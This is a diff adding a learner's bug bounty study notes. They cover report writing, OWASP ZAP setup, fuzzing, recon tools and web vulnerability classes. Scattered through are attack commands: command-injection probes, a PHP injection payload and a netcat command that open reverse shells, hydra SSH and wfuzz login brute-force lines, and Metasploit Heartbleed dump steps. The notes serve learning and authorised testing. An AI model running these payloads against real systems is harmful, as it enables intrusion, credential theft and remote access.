@@ -1,0 +1,517 @@
+this is the bug bounty notes. _________________
+
+first important things that should be present in the bug report
+
+    mention the title of the bug
+
+    steps to produce it (how did u exploit it)
+
+    how to patch it 
+
+    what can bad guys do with that vulnerabiltity
+
+    the environ ment used like browser os version etc ..
+
+    and the details like url and location and the tag which is vulnerable should be used and 
+    if u want u can add videos and images
+
+    read the terms and condition properly
+
+    dont for get to mention your details like email name etc ..
+
+    edit the photos before uploading the screen short
+
+    add your details and email
+
+using firefox the extions are __________________________________________________________________________________________
+
+    foxyproxy
+    cookie editor or cookie editor +
+    built with (or)
+    wappilizer
+
+tools used for other things
+
+    wfuzz -fuzzing
+    knock py , sublister - subdomine enumeration
+    scapy
+    sqlmap
+    stricker
+    Striker
+    commix
+
+websites
+
+    cyberchief
+    whatcms
+
+    
+    owasp zap ___________________________________________________________
+    
+    it has a interception proxy that is used to its mostly common as burpsuite
+
+    to enabel the zap proxy we need to (if u have done evething in 1 and 2 go directly to the 3rd step)
+
+        !)generate a certificate
+        2)add that certificate for ssl and
+        3) add the localhost and the port 8080 as the proxy in the browser
+
+    you can set up zap to work wit any ip or port
+
+        tools->options->local proxy
+
+you can run a sider and u can use active scan to find easy vulnerabitiys
+
+right click on the website to add thwe context (tis allows us to ignore few sites)
+
+safe mode dont allows u to attack
+
+protected mode allowes only to the urls within the scope 
+
+standard mode allows all
+
+u can flag the url;s as a log in page and u can highlite the loged in response so that zap auto login for u
+
+for video tut use this https://www.youtube.com/playlist?list=PLEBitBW-Hlsv8cEIUntAO8st2UGhmrjUB
+
+to get zap memory           -https://www.youtube.com/playlist?list=PLEBitBW-Hlsv8cEIUntAO8st2UGhmrjUB
+to get owasp memory         -https://owasp.org/www-project-top-ten/
+to get other memory         -https://tryhackme.com/
+to get bug bounty memory    -https://www.youtube.com/playlist?list=PLBf0hzazHTGNJXBjepzN7l9OHcuH9ZvOq
+
+the list that can help avalible in - https://github.com/danielmiessler/SecLists
+
+to spot many vulnerablity see the url and sorce code u will detect vulnerablity like iframe,xss etc ...
+
+the tutorial we used for this is
+
+
+https://www.youtube.com/playlist?list=PLEBitBW-Hlsv8cEIUntAO8st2UGhmrjUB
+https://www.youtube.com/playlist?list=PLBf0hzazHTGNJXBjepzN7l9OHcuH9ZvOq
+https://www.youtube.com/playlist?list=PLnIuGyeSptxhuYDyj2MA4lshSRi9TseYy
+https://www.youtube.com/playlist?list=PLBf0hzazHTGO3EpGAs718LvLsiMIv9dSC
+https://www.youtube.com/watch?v=hrVa_dhD-iA
+https://www.youtube.com/watch?v=u_gOnwWEXiA
+https://www.udemy.com/course/android-bug-bounty-hunting-hunt-like-a-rat/
+https://www.udemy.com/course/parameter-tampering-bug-bounty-hunting/
+https://www.udemy.com/course/web-security-bug-bounty-basics/q
+https://www.bugcrowd.com/hackers/bugcrowd-university/
+https://tryhackme.com/hacktivities
+https://pentester.land/list-of-bug-bounty-writeups.html#bug-bounty-writeups-published-in-2021
+
+now practing owasp
+
+    1)authentication,session and user management
+
+    -setup proxy
+    -enable cert
+    -go to the vulnerable website
+    -set the scope
+    -set auth -u can manually log in -u can set users also
+    -set session management
+    -spider 
+
+    if u have mentioned the user u can spider as him
+
+    you can force the users using force user tab to log in as the user in every page u have to enable it by pressing on the button on the owasp main window tab to enable force user 
+
+    u can access the setting in the above icons
+    ucan resend a message using right click
+
+    2) Ajax Spidering authenticated websites
+
+    -you can directly start ajax spider on the particular url if it didnt had any login page
+    -you have to identifiy the cookie that is responsible to keep the session active which keeps u login
+    mark it in the params tab and right click it and flag as session token
+
+    -if it has login page log out if u are log in and again log in and now see http sessions tab and right 
+    click it and add it in active
+    
+    -now run ajax spider in scope dont forget to remove the logout link from scope pick that requst or 
+    identify the url make it out of scope in spider
+
+    -now u can active scan all or pages in a sub tree
+    -you can add the session tokens maually by tools->options->http sessions and add the token
+
+    3)injection
+
+    -active scan the particular domine for vulnerability
+    -go to tools option to change the active scan modes
+    -after the scan go to alerts tab and check 
+    
+    -in request tab u can fuzz the requst and have a sql fuzz list to confirm it and right click on the word 
+    to fuzz it mostly the url is used for fuzzing
+
+    -you can also encode and decode the hash from tools->encoder/decoder
+
+    4)ZAP Deep Dive
+
+    -USE MANUAL EXPLORE it does launch the browser and performs certain actions on the specified url
+
+    - go to the local host proxy where the zap is running to get userfriendly easy methods
+    -u can save the bug hutng prossos and expor it and import it anyone
+    -some times variable of get and post use ;: for variables and zap doesnt find it
+    
+    -u can specify at the context options->structure add key value pair separators "&;" ,seperator as  "=:" it works only on the above eg for each websit it may vary
+
+    -if a application runs and shows the pages according to a varible used in url eg page=home page =about page =contact us the zap will take that variable as constant then it will not attack it to avoid it go to "context option"->structor->add[structural parameter](button) and add the varible in that list for more refrence see from 14:00 - https://www.youtube.com/watch?v=1_flXEBzEsE&list=PLEBitBW-Hlsv8cEIUntAO8st2UGhmrjUB&index=24
+
+    - you can code for zap in python and download form community scripts also cool!
+
+    -some websites use 200 code for 404 error pages you can select the string from the error page response then right click and "flag as context" -> "default context coustom page" and select the error page or not found page etc ...
+
+    -autentication some times can be from request and response viseversa u can change it in opetions of context
+    - in oprtions passivescanner u can enable scan during fuzzer and many more options are avalable
+    -the zap used to save logs 
+    -you can automate the zap using command line and the doc is given in https://www.zaproxy.org/docs/desktop/cmdline/
+
+    5)active scan
+
+    -u can start active scan from quick start menu and u can select the normal spider or ajax spider 
+    -by clicking in the show progress u can skip certain webpages
+    -u can run multiple active scans depends on ur pc
+    -u can right click on the web branch to run multiple acttacks also
+    -u can change the polacy form the scan polociy icon to know more see the zap scan rules
+    -u can enable attack mode from standard mode to scan pages where u are manually exploreing
+
+    6)zap report generation 
+
+    -you can generate a report from generate report icon
+    
+    7)u can program zap scripts with zest links
+
+    -https://www.youtube.com/watch?v=DW_vXdEOoVA&list=PLEBitBW-Hlsv8cEIUntAO8st2UGhmrjUB&index=36
+
+    8)fuzzing
+    -u can use the fuzzer for bruteforce select file fuzzer for txt file 
+
+    for more zap reference go through this https://www.youtube.com/playlist?list=PLEBitBW-Hlsv8cEIUntAO8st2UGhmrjUB
+
+BUG BOUNTY tips
+
+    -if u find any file called test in the webserver try to exploit it because it is more vulunerable
+        --same as robot .txt
+        --/.git/
+        --backup or log
+        --test
+        --test.php
+        --access_log or logs
+        --access
+        --etc
+    
+    -if u find the log or sql or backup or something strange files search for the admin logs 
+
+Finding hidden directorys in a website 
+
+    -there are many tools like dirserch,dirbuster,gobuster,dirb etc ....
+        --eg cmd:-# dirsearch.py --url "http://10.0.2.10" -e txt,html,htm,sql,php,log
+
+                where: 
+                    "dirsearch.py" is the program avalibel in git
+                    "--url" is a parameter to specify the url
+                    ""http://10.0.2.10"" is the url
+                    "-e" is a parameter to specify the website file extensions eg index.php
+                    "txt,html,htm,sql,php,log" is the extensions
+
+command injection
+
+    -this is nothing but u can run the user commands in the given input
+
+    -if the command injection doesnt show any output try to add some sleep and check whether the server request gets slow
+        --cmd:-# ping -c 4 8.8.8.8; sleep 5
+        --cmd:-# ping -c 4 8.8.8.8& sleep5
+        --cmd:-# ping -c 4 8.8.8.8 | sleep 5
+
+            note : sleep will make command req slow or make dns requset which we can track and the above mentioned cmd does not run in windows in windows try something like "ping 1.1.1.1;Start-Sleep -s 15" --for powershell and
+            "ping 1.1.1.1;ping [your ip and check the network traffic]"
+
+    -some languages use different commenting methods so follow accordingly
+
+    -by tracking the response time we can see a delay made from server
+    -https://www.acunetix.com/blog/articles/code-injection/
+    -https://www.netsparker.com/blog/web-security/remote-code-evaluation-execution/
+
+SQL injection     
+
+    -same as the command injection but only works with the sql commands and "--" is the comment 
+
+    -union can be used for printing values from other tables also
+
+    -in case of the blind injection we can use sleep
+    
+        --cmd:-# code,sleep(1),sleep(10)
+
+    -by tracking the response time we can see a delay made from server
+
+    -use the sqlmap for more complex injections
+    -https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/
+    -https://www.exploit-db.com/papers/13045
+
+sql defence
+
+    -check online
+    -https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
+
+csrf - cross site request forgery
+
+    -check for csrf token if they exist try if they are predictable some time tokens dont work
+    -some time u need to make the data in to json
+    -https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+
+
+xss
+
+    -some times its hard to find it use the wordlist
+    -https://excess-xss.com/
+
+xxe 
+
+    -this is a xml based attack and dos can be made with lots of laugh
+    -try online wordlist and in requst if u saw xml 
+    -more --https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/
+    -     --https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/
+
+https://www.udemy.com/course/web-security-bug-bounty-basics/ -basics bug concepts for reference
+
+practice - https://xss-game.appspot.com/
+
+wfuzz
+
+    -it is used to find web content,form manuplation,bruteforce use sec list if you are going to perform bruteforce
+
+    -u can see options using
+        # wfuzz --help
+
+    -bruteforce eg
+        # wfuzz -c -w /root/desktop/wordlist.txt --hs Invalid -d "log=admin@example.com&pwd=FUZZ" -u http://192.168.1.109/wp-login.php
+
+            where:
+                
+                wfuzz = is the tool
+                
+                -c = output with colors
+                
+                -w = wordlist loctaion
+                
+                /root/desktop/wordlist.txt = wordlist
+                
+                --hs = this compares the regex and hides this considering as invalid opposite is "--ss"
+                
+                Invalid = the regex string on error or wrong password
+                
+                -d = post requst u can see this in burpsuit or zap
+                
+                "log=admin@example.com&pwd=FUZZ" = is the request and "FUZZ" is the place this program will bruteforce with different words from the word list
+                
+                -u = url to attack
+
+                http://192.168.1.109/wp-login.php = url
+
+    - reffer https://www.youtube.com/watch?v=1Do5VjeEVjg&list=PLBf0hzazHTGNJXBjepzN7l9OHcuH9ZvOq&index=2 for doubts
+
+    anothor cmd for web content discovery
+
+        # wfuzz -w /wordlist_loc --hc 403,404 -u http://asd.com/FUZZ
+
+        where
+
+            --hc = will hide the respose with the codes mention here it is 403,404 -sc is oposite
+
+iframe and html injecttion
+
+    -this is a vulnerability and u have to embed an external page in the iframe using url param to inject any thing.
+
+    -or u can directly embed the html code in the request using burpsuite
+
+burpsuite
+
+    -enable the burp check proxy set in browser install cert
+    -for more https://www.youtube.com/playlist?list=PLBf0hzazHTGO3EpGAs718LvLsiMIv9dSC -burpsuite pentest basics 
+
+wafw00f - web application firewall detection tool
+
+    -this application is used to find the firewall
+    -usage :cmd-#wafw00f [url without bracket]
+
+google dorking
+
+    THIS is mostly used for infog or recon (passive) or footprinting
+    some common pay loads - https://securitytrails.com/blog/google-hacking-techniques
+    and examples - https://gist.github.com/clarketm/919457847cece7ce40323dc217623054
+    hacking data base - https://www.exploit-db.com/google-hacking-database
+    use ctrl + f to find required test
+
+theHarvester
+
+    this is a passive recon tool
+    u can gather public information using this 
+    eg : theHarvester -d starbucks.com -d google
+    this command searches about the starbucks website in google 
+    for help type help
+
+Heartbleed Exploit
+
+    u need to first scan the web server with nmap
+    eg : sudo nmap -sV -A 192.168.1.158
+    then  get the port and then run nmap script for heart bleed
+    eg : sudo nmap -p 8448 --script ssl-heartbleed 192.168.25.55
+    then start the metasploit 
+    eg : msfconsole
+    eg : search openssl_heartbleed
+    eg : use auxlary/scanner/ssl/openssl_heartbleed
+    eg : set rhost 192.12.147.22
+    eg : set rport 1425
+    eg : show info
+    eg : set action scan    #just scans
+    eg : run
+    eg : set action dump    #dumps data
+
+    open a new terminal 
+
+    and run strings command on the gotten url
+    
+    eg : strings /home/alexs/.mssd/asd/asd/as/dads/a/d/a.bin     #converts into readable content
+
+    it will dump all info u can read and find for vulnerable data
+    google what u can do with the recived data
+
+php code injection
+
+    if u see any parameters in url like id=123 and if the website is running php this types of vulnerablity can be seen
+    the php code injection doesnt reflect the html code
+    use w3schools for same codes in php or exploit db
+
+    eg exploit : id=123;system("pwd"); //this exploit shows the the current working directory
+
+    u can enable the reverse shells and access usning netcat
+
+    reverse shell using the nc or netcat
+
+    hacker side(hs):- nc -nvlp 1234
+    serverside in url:- id=123;system("nc 192.168.1.101 1234 -e /bin/bash"); //use cmd if the server is in windows
+    
+html injection reflected and stored post
+
+    when the html input is dirctly get as input and posted in the web page then this is know as html inj and if this done with the form then this occur
+    it can be eather stored or reflected and this is like xss but with html
+    u can use this to get passwords using iframe and the netcat listener and this can be done oly by social enginering
+
+os command injection 
+
+    this happens when the input from the website is run in the os like ping command etc 
+    this can be in any back end language bash,python,go etc ...
+    we can run the local commands like whoami and u can directly run the net cat listener and the command
+    use diffrent attributs like ;&| because some use prematured filtures
+
+    eg: 123.com;pwd
+        123.com&&pwd
+        123.com||pwd
+    
+    u can use tools like commix use help
+    eg : commix --url="url.com" --cookie="take from burp proxy with security level also" --data="the post requst sent include the submit if avalible "
+
+    the comix will try complicated stuff
+
+    
+
+
+https://www.youtube.com/playlist?list=PLBf0hzazHTGO3EpGAs718LvLsiMIv9dSC -burpsuite pentest basics 
+https://www.youtube.com/playlist?list=PLBf0hzazHTGNJXBjepzN7l9OHcuH9ZvOq -hs sploit bug bounty
+https://www.youtube.com/playlist?list=PLnIuGyeSptxhuYDyj2MA4lshSRi9TseYy -google doc and bug bounty doc
+
+upgrade
+
+https://pentester.land/list-of-bug-bounty-writeups.html#bug-bounty-writeups-published-in-2021
+
+
+
+how to write  a bug bounty report
+
+    the things should be avalible
+
+        use web for more info in any sub model
+
+            vulnerablity name -
+            vulnerablity description - what is that vulnerablity and what are the dangers
+            vulnerable url -
+            payload -
+            steps to produce - steps
+            impact - what are the dangers and how to implement them
+            how to resolve it -
+            poc - screen shot ,video etc
+            and ur info -name email and any social media site 
+           
+            now running 
+
+the harvester 
+    
+    this is a osint tool this can be used only for companey name or domine name
+    see -h for help
+
+shodan
+
+    this a search engine and this is used for osint for  the devices 
+    and this is a web application go to url
+    https://www.shodan.io/
+    or use terminal version type # shodan
+    use https://www.robtex.com/ for  first infog
+
+nmap
+
+    this a network scanner 
+    nmap --help for more 
+    press v for increase the verbosity level and enter to show currrent progress
+    u can also do mutiple scaning to do it like pro see cheat sheet
+
+nikto
+    this is a website vulnerablity scanner
+    # nikto -h 
+    for help
+
+nessus
+
+    this is also a vulnerablity scanner use to generate reports also
+    install ssl certificate after installling
+    
+netcat
+
+    this  nife known as swis arm
+    simple reverse shell using net cat 
+    #nc -lvp 4444
+    #nc ipadd 4444 -e /bin/sh
+
+steghide 
+
+    this is a image stegnatography tool with encryption
+    u can simply tell author data using exiftool or echo 
+    this can be used to embed the text file also 
+
+hydra
+
+    hydra is a bruteforer
+    #hydra -h 
+    this command is for help
+    this can be used for brute forcing ssh also
+    command to attack ssh
+    hydra -l root -P pass.txt 192.168.1.5 ssh
+
+unshadow
+    see
+
+john 
+    this used to crack thing see more
+
+dig
+    this used for dns infog
+    eg cmd
+    dig 1.1.1.1
+    url directly can be used
+    
+bug bounty platforms
+
+    hackerone
+    bugcrowd
+    search bugbounty dork in google
+    check money
+    open bug bounty
+    
